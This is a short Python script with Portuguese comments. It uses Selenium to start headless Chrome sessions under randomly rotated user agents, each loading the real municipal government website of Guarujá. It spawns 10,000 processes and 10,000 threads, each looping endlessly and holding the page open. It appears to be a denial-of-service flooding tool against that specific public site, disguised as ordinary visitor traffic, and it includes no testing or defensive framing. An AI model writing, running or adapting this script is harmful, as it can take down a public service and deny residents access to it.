from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import random
import multiprocessing
import threading

# Lista de user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
]

def open_tabs():
    while True:
        try:
            # Seleciona um user agent aleatório
            user_agent = random.choice(user_agents)
            
            # Configurações do Chrome
            chrome_options = Options()
            chrome_options.add_argument("--headless")  # Execução em modo Headless
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument(f"user-agent={user_agent}")
            
            # Inicializa o navegador Chrome com as opções configuradas
            driver = webdriver.Chrome(options=chrome_options)
            
            # Navega para a URL desejada
            driver.get("https://www.guaruja.sp.gov.br/")
            
            # Aguarda um longo período de tempo para manter a aba aberta
            time.sleep(random.uniform(60, 120))
        
        except Exception as e:
            print(f"Erro: {str(e)}")

def create_processes():
    for _ in range(10000):
        process = multiprocessing.Process(target=open_tabs)
        process.daemon = True
        process.start()

def create_threads():
    for _ in range(10000):
        thread = threading.Thread(target=open_tabs)
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    create_processes()
    create_threads()
    while True:
        pass